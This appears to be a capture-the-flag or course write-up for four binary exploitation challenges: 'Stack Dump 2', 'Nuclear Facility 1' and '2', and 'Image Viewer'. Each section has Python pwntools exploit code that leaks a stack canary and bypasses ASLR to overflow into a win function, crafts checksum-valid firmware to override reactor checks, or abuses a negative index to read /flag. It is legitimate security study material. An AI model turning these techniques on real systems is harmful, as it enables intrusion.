Stack Dump 2
===========================

General overview of problems faced
-------------------------------------
Finding the canary was a challenge, I was not able to work out the offset correctly to read the canary memory field.

List of vulnerabilities
--------------------
Use of gets when reading length of entered string allows for buffer overflow. Also, program allows user to read arbitrary memory, which allows it to leak the canary.

Steps to exploit
------------------
Similar to original stack-dump except this time we had to calculate the base of the offsets to bypass ASLR. To achieve this, find the address of the instruction pointer (located right after the stack pointer, it points to main+40), read its value and use that value to set the base offset for the binary.

Script/Command used
------------------
```python

def runner(send):
    P.recvuntil(b'[q]uit', drop=True)
    if(send in ['i', 'd', 'p', 'q']):
        P.sendline(send.encode())

def say(length, payload):
    runner('i')
    P.recvuntil(b'len: ', drop=True)
    P.sendline(length)
    P.sendline(payload)

######################################
############## Exploit ###############
######################################

def exploit():
    connect_binary()
    P.recvuntil(b'pointer ', drop=True)
    orig_stk_ptr = int(P.recvline(), 16)
    stk_ptr = p64(orig_stk_ptr + 65)
    leak = p64(orig_stk_ptr + 0x61) # points to main + 40

    log.info("Canary pointer: %x" % (u64(stk_ptr)))
    log.info("Stack pointer: %x" % (orig_stk_ptr))
    log.info("Leak: %x" % (u64(leak)))

    say(str(len(stk_ptr)).encode(), stk_ptr)

    runner('d')
    P.recvline()
    canary = re.search(b': (.*)\n', P.recvline()).group(1)[:8]
    log.info("Canary: %s" % canary)

    say(str(len(leak)).encode(), leak)
    runner('d')
    P.recvline()
    function = P.recvline()[28:36]
    log.info("Function: %s" % function)

    leak = u64(function)
    base = leak - 40 - E.symbols['main']
    win = base + E.symbols['win']
    payload = b'A' * 56 + canary + b"A" * 24 + p64(win)

    say(str(len(payload)).encode(), payload)
    runner('q')
    P.interactive()
    P.close()

```

Nuclear Facility 1
===========================

General overview of problems faced
-------------------------------------
N/A

Steps to exploit
------------------
Craft input based on checksum logic to update firmware. 

Script/Command used
------------------
```python
def update_firmware():
    firmware = bytearray(512)
    firmware[0] = 0x46  # 'F'
    firmware[1] = 0x57  # 'W'
    firmware[2] = 0x31  # '1'
    firmware[3] = 0x32  # '2'

    firmware[4] = 0x00
    firmware[5] = 0x00

    for i in range(6, 512):
        firmware[i] = 0x01  

    var_10 = sum(firmware[6:512])

    rax_24 = ((var_10 >> 0x1f) >> 0x18)
    rdx_5 = (((var_10 + rax_24) - rax_24) & 0xFF)  

    firmware[4] = rdx_5 // 2
    firmware[5] = rdx_5 - firmware[4]

    return firmware
```


Nuclear Facility 2
===========================

General overview of problems faced
-------------------------------------
N/A

Steps to exploit
------------------
Craft input based on checksum logic to update firmware. Input must also be able to override precheck reactor checks.

Script/Command used
------------------
```python

def execute_firmware():
    firmware = bytearray(512)
    firmware[0:4] = b"FW12" 

    padding_length = 0x4220 - 0x4024  
    firmware.extend(b'A' * padding_length)
    firmware.extend((0x6e00).to_bytes(4, byteorder='little')) 
    firmware.extend((0x0001).to_bytes(4, byteorder='little')) 
    firmware.extend((0x0001).to_bytes(4, byteorder='little'))  
    firmware.extend(b'\x00' * (2048 - len(firmware)))

    return firmware

```


Image Viewer
===========================

General overview of problems faced
-------------------------------------
Had trouble offsetting correctly to read the image struct and the filename.

Steps to exploit
------------------
The strategy is to index back into your buffer and read from your own image struct. We can also insert the flag in the same buffer and then insert a pointer to where the flag is located to read from that value.

Script/Command used
------------------
```python

def exploit():
    P.recvuntil(b'$ ', drop=True)
    P.sendline(b'password123')
    payload = b"-14" + b'a'*13 # 16 bytes
    payload += b'/flag' + b'\0' * 11 # 16 bytes
    payload += b"\xf2\xff\xff\xff\x00\x00\x00\x00" # 8 bytes
    payload += p64(0x404090) # 8 bytes
    payload += b'\0' * (256 - len(payload)) # another 13 chunks of 16 bit sized blocks
    P.sendline(payload)
    P.interactive()

```

